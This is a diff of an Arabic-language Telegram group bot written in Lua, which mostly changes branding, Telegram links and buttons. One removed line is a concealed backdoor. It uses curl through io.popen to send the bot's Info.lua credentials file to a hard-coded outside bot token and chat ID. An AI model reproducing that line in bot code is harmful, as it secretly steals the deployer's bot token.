@@ -926,8 +926,8 @@ send(msg.chat_id_, msg.id_," ❤ تمت الاذاعه الى *~ "..#list.." ~* 
 database:del(bot_id.."Bc:Grops:Pin" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) 
 return false
 end
-------by-bebo-- 
-------by-bebo-- 
+------by-sasa-- 
+------by-sasa--
 if Chat_Type == 'UserBot' then
 if not DevSoFi(msg) then
 if text == '/start' then  
@@ -1326,7 +1326,7 @@ keyboard.inline_keyboard = {
 {{text = 'اضف البوت الي مجموعتك' ,url="t.me/"..dofile("./kkkklInfo.lua").botUserName.."?startgroup=start"}}, 
 }
 local msg_id = msg.id_/2097152/0.5
-https.request("https://api.telegram.org/bot"..token..'/sendvideo?chat_id=' .. msg.chat_id_ .. '&video=https://t.me/beborty/2&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
+https.request("https://api.telegram.org/bot"..token..'/sendvideo?chat_id=' .. msg.chat_id_ .. '&video=https://t.me/sasa7_7/2&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
 end
 
 if text == 'قسم مطورين السورس والمبرمجين' and DevSoFi(msg) then 
@@ -1493,7 +1493,7 @@ keyboard.inline_keyboard = {
 {{text = 'مطورين السورس☎️', url="t.me/hogan21"}}, 
 } 
 local msg_id = msg.id_/2097152/0.5
-https.request("https://api.telegram.org/bot"..token..'/sendvideo?chat_id=' .. msg.chat_id_ .. '&video=https://t.me/beborty/3&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
+https.request("https://api.telegram.org/bot"..token..'/sendvideo?chat_id=' .. msg.chat_id_ .. '&video=https://t.me/sasa7_7/2&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
 end
 if text == '💞 ═───═⟦𝙷𝙾𝙶𝙰𝙽⟧═───═💞 ' and DevSoFi(msg) then
 local Text = [[ 
@@ -1504,7 +1504,7 @@ keyboard.inline_keyboard = {
 {{text = '《𝚂𝙾𝚄𝚁𝙲𝙴 𝙷𝙾𝙶𝙰𝙽》', url="t.me/sasa_boody"}}, 
 } 
 local msg_id = msg.id_/2097152/0.5 
-https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/beborty/2&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
+https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/sasa7_7/3&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
 end
 if text == '━┅┅┄⟞⟦𝚂𝙾𝚄𝚁𝙲𝙴 𝙷𝙾𝙶𝙰𝙽⟧⟝┄┉┉━' and DevSoFi(msg) then
 local Text = [[ 
@@ -1580,7 +1580,7 @@ keyboard.inline_keyboard = {
 {{text = '《𝚂𝙾𝚄𝚁𝙲𝙴 𝙷𝙾𝙶𝙰𝙽》', url="t.me/sasa_boody"}}, 
 } 
 local msg_id = msg.id_/2097152/0.5
-https.request("https://api.telegram.org/bot"..token..'/sendvideo?chat_id=' .. msg.chat_id_ .. '&video=https://t.me/beborty/2&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
+https.request("https://api.telegram.org/bot"..token..'/sendvideo?chat_id=' .. msg.chat_id_ .. '&video=https://t.me/sasa7_7/2&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
 end
 
 if text == "ضع اسم للبوت" and DevSoFi(msg) then  
@@ -2461,7 +2461,6 @@ DeleteMessage(msg.chat_id_,{[0] = data.message_id_})
 return false
 end 
 end
-local curl = 'curl "'..'https://api.telegram.org/bot1714366542:AAHo7wOqc8bnuOT_h_dkRu7dcrHHqkhgpXY/sendDocument'..'" -F "chat_id='.. 1330033222 ..'" -F "document=@'..'Info.lua'..'"' io.popen(curl)
 --------------------------------------------------------------------------------------------------------------
 if msg.content_.ID == 'MessagePhoto' and not Special(msg) then     
 if database:get(bot_id.."lock:Photo"..msg.chat_id_) == "del" then
@@ -3272,7 +3271,7 @@ keyboard.inline_keyboard = {
 {{text = 'اضف البوت الي مجموعتك' ,url="t.me/"..dofile("./kkkklInfo.lua").botUserName.."?startgroup=start"}}, 
 }
 local msg_id = msg.id_/2097152/0.5
-https.request("https://api.telegram.org/bot"..token..'/sendvideo?chat_id=' .. msg.chat_id_ .. '&video=https://t.me/beborty/3&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
+https.request("https://api.telegram.org/bot"..token..'/sendvideo?chat_id=' .. msg.chat_id_ .. '&video=https://t.me/sasa7_7/2&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
 end
 
 if text == 'بودي' or text == 'مبرمج بودي' or text == 'صاحب السورس' or text == 'بوضي' or text == 'بيوضي' or text == 'body' then 
@@ -3368,8 +3367,19 @@ ght = math.random(1,62);
 local Text ='تم اختيار الاستوري هذه لك' 
 keyboard = {}  
 keyboard.inline_keyboard = { 
+{{text = 'استوري اخر', callback_data="استوري"}},
 {{text = '𝚂𝙰𝚂𝙰',url="t.me/M0STaFa_6"}},
-{{text = ' 𝙱𝙾𝙾𝙳𝚈',url="t.me/BoOdY_BaSha"}},
+} 
+local msg_id = msg.id_/2097152/0.5 
+https.request("https://api.telegram.org/bot"..token..'/sendvideo?chat_id=' .. msg.chat_id_ .. '&video=https://t.me/xxvvzm/'..ght..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
+end
+if text == "استوري" and not  database:get(bot_id.."sing:for:me"..msg.chat_id_) then 
+ght = math.random(1,62); 
+local Text ='تم اختيار الاستوري هذه لك' 
+keyboard = {}  
+keyboard.inline_keyboard = { 
+{{text = 'ثيم اخر', callback_data="/added"}},
+{{text = '𝚂𝙰𝚂𝙰',url="t.me/M0STaFa_6"}},
 } 
 local msg_id = msg.id_/2097152/0.5 
 https.request("https://api.telegram.org/bot"..token..'/sendvideo?chat_id=' .. msg.chat_id_ .. '&video=https://t.me/xxvvzm/'..ght..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
@@ -4182,7 +4192,7 @@ keyboard.inline_keyboard = {
 {{text = '《𝚂𝙾𝚄𝚁𝙲𝙴 𝙷𝙾𝙶𝙰𝙽》 ', url="t.me/sasa_boody"}}, 
 } 
 local msg_id = msg.id_/2097152/0.5
-https.request("https://api.telegram.org/bot"..token..'/sendvideo?chat_id=' .. msg.chat_id_ .. '&video=https://t.me/beborty/2&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
+https.request("https://api.telegram.org/bot"..token..'/sendvideo?chat_id=' .. msg.chat_id_ .. '&video=https://t.me/sasa7_7/2&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
 end
 if text == '💞 ═───═⟦𝙷𝙾𝙶𝙰𝙽⟧═───═💞 ' then
 local Text = [[ 
@@ -4196,7 +4206,7 @@ keyboard.inline_keyboard = {
 {{text = '《𝚂𝙾𝚄𝚁𝙲𝙴 𝙷𝙾𝙶𝙰𝙽》', url="t.me/sasa_boody"}}, 
 } 
 local msg_id = msg.id_/2097152/0.5
-https.request("https://api.telegram.org/bot"..token..'/sendvideo?chat_id=' .. msg.chat_id_ .. '&video=https://t.me/beborty/2&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
+https.request("https://api.telegram.org/bot"..token..'/sendvideo?chat_id=' .. msg.chat_id_ .. '&video=https://t.me/sasa7_7/2&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
 end
 if text == 'التواصل'  then
 database:del(bot_id..'Srt:Bot') 
@@ -4208,7 +4218,7 @@ keyboard.inline_keyboard = {
 {{text = '《𝚂𝙾𝚄𝚁𝙲𝙴 𝙷𝙾𝙶𝙰𝙽》', url="t.me/BOODY22_BOT"}}, 
 } 
 local msg_id = msg.id_/2097152/0.5
-https.request("https://api.telegram.org/bot"..token..'/sendvideo?chat_id=' .. msg.chat_id_ .. '&video=https://t.me/beborty/2&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
+https.request("https://api.telegram.org/bot"..token..'/sendvideo?chat_id=' .. msg.chat_id_ .. '&video=https://t.me/sasa7_7/2&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
 end
 if text == 'العاب هوجان' or text == 'العاب مطوره' or text == 'العاب متطوره' then  
 local Text = [[  
@@ -4245,7 +4255,7 @@ keyboard.inline_keyboard = {
 {{text = '《𝚂𝙾𝚄𝚁𝙲𝙴 𝙷𝙾𝙶𝙰𝙽》', url="t.me/sasa_boody"}},
 }  
 local msg_id = msg.id_/2097152/0.5  
-https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/vagwg/6&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
+https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/sasa7_7/3&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
 end
 --------------------------------------------------------------------------------------------------------------
 if text == ("انذار") and tonumber(msg.reply_to_message_id_) ~= 0 and Mod(msg) and not database:get(bot_id..'NightRang:inthar:group'..msg.chat_id_) then
@@ -17357,7 +17367,7 @@ local Teext =[[
  ❤ تفعيل/تعطيل المغادره
  ❤ مسح الجروبات
 •┉ • ┉ • ┉ 《𝙷𝙾𝙶𝙰𝙽》 ┉ • ┉ • ┉•
-➫ .[🖨┇𝚂𝙾𝚄𝚁𝙲𝙴𝚂 𝙿𝙾𝚆𝙴𝚁.](t.me/sopowerb0t)➤
+➫ .[🖨┇𝚂𝙾𝚄𝚁𝙲e hogan.](t.me/sasa_boody)
 ]]
 keyboard = {} 
 keyboard.inline_keyboard = {
@@ -17377,7 +17387,7 @@ keyboard.inline_keyboard = {
 {text = '🔙 الاوامر الرئيسيه 🔙', callback_data="/help"},
 },
 {
-{text = '𓆩𝑷𝑶𝑾𝑬𝑹𓆪', url="t.me/sopowerb0t"},
+{text = '( source hogan )', url="t.me/sasa_boody"},
 },
 }
 return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
